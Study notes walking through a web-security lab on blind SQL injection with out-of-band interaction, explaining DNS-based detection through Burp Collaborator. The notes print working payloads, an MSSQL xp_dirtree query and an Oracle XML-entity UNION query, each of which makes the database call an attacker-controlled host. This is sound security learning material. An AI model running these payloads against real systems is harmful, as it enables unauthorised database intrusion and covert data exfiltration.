## Introduction
- Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection
- In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.
- A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service).
- This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.
- The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator.
- This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.
- The techniques for triggering a DNS query are highly specific to the type of database being used.
- On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This will cause the database to perform a lookup for the following domain:
```sql
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

## Steps to solve lab
### Desc - Blind SQL injection with out-of-band interaction
**Our end goal** - This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

`UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://itfafsrokyrrvo87xpa4udlo6fc60wol.oastify.com/"> %remote;]>'),'/l') FROM dual`

1. Send the `/` to burp Repeater and analyse the `trackingId` parameter.
![[Blind_SQL_injection_with_out-of-band_interaction.png]]

2. Now, pick any payload from [[SQL injection cheat sheet]] and try to do a DNS request to your burp collaborator domain and monitor for any interations.
![[Blind_SQL_injection_with_out-of-band_interaction2.png]]

3. Now, you know there is a DNS request send to your Collaborator server. So, navigate to Collaborator tab and click on poll now.
![[Blind_SQL_injection_with_out-of-band_interaction3.png]]

